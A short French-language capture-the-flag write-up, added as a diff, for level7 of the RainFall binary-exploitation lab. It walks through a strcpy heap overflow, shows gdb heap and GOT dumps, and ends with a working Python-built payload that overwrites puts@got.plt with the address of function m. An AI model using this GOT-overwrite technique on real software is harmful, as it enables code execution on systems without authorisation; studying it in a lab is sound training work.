@@ -1,0 +1,32 @@
+la fonction strcpy est vulnerable au buffer overflow
+
+
+dans ce niveau on remarque que le mot de passe est stocker dans une variable global nomme c et qu'elle est afficher dans la fonction m.
+malheuresement cette fonction n'est jamais appele.
+
+level7@RainFall:~$ ./level7 AAAAAAAAAAAAAAAAAAAAAAAA BBBB
+Segmentation fault (core dumped)
+
+(gdb) x/20 0x804a008    malloc 1
+0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
+						malloc 2
+0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
+
+en regardant de plus pret le tas on remarque que si le premier malloc est un peu trop remplis, il va venir ecraser l'addresse contenu dans le 2eme malloc.
+or
+   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+
+ le 2eme strcpy ce sert de cette valeur comme point de reecriture.
+une fois la variable c initilise le code fais appel a la fonction puts
+et si on la regarde de plus pret on peut voir qu'il est possible de modifier son addresse.
+
+ (gdb) x/i 0x8048400
+   0x8048400 <puts@plt>:	jmp    *0x8049928
+(gdb) x 0x8049928
+   0x8049928 <puts@got.plt>:	push   %es
+ 
+ ce qu'il nous reste a faire et de passer en second parametre l'addresse de la fonction m et en premier parametre un nombre de caractere suffisant puis mettre l'addresse de puts
+
+ ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
